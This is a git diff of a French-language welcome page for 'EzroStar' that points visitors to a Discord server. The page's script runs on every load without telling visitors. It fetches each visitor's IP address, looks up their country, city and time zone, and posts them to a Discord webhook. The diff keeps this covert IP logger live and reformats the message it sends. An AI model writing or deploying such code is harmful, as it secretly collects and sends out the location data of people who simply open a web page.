@@ -1,8 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <!-- ... (autres balises meta et liens) ... -->
 </head>
+
 <body>
     <h1>Bienvenue sur le site d'EzroStar. Veuillez rejoindre le Discord pour plus d'infos :</h1>
     <a href="https://discord.gg/GsDsDzp6bB" target="_blank" class="discord-button">Discord</a>
@@ -21,7 +23,7 @@
         const getIpGeolocation = async (ipAddress) => {
             const response = await fetch(`${ipGeolocationURL}&ip=${ipAddress}`);
             const data = await response.json();
-            console.log(data);  // Ajout du console.log pour afficher les détails dans la console
+            console.log(data); // Ajout du console.log pour afficher les détails dans la console
             return data;
         };
 
@@ -31,33 +33,54 @@
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ embeds: [embed] })
+                body: JSON.stringify({
+                    embeds: [embed]
+                })
             });
         };
 
-        const sendWebhookOnVisit = async () => {
+        const sendWebhookWithMessage = async () => {
             const ipAddress = await getIpAddress();
             const ipGeolocationData = await getIpGeolocation(ipAddress);
 
             const embed = {
                 title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
-                description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||**`,
-                color: 0x00ff00
+                color: 0x2b2d31,
+                image: {
+                    url: "https://media.discordapp.net/attachments/1209907966501855313/1210906616195457045/standard_5.gif?ex=65ec43aa&is=65d9ceaa&hm=f40a4e7cc1372d0fdcaa53bb4e2da6709588e2234e3651eaa013d8de2e6bb5bf&=&width=936&height=120"
+                },
+                fields: [
+                    {
+                        name: "Adresse IP",
+                        value: `|| ${ipAddress} ||`,
+                        inline: true
+                    },
+                    {
+                        name: "Pays",
+                        value: `|| ${ipGeolocationData.country_name} ||`,
+                        inline: true
+                    },
+                    {
+                        name: "Ville",
+                        value: `|| ${ipGeolocationData.city} ||`,
+                        inline: true
+                    },
+                    {
+                        name: "Fuseau horaire",
+                        value: `|| ${ipGeolocationData.time_zone} ||`,
+                        inline: true
+                    },
+                    // Ajoutez d'autres champs ici
+                ]
             };
 
             // Envoie du message via le webhook Discord
             await sendWebhook(embed);
         };
 
-        // Appelle la fonction à chaque chargement de la page
-        sendWebhookOnVisit();
-    </script>
-</body>
-</html>
-
-
         // Appelle la fonction au chargement de la page
-        sendWebhookOnce();
+        sendWebhookWithMessage();
     </script>
 </body>
+
 </html>
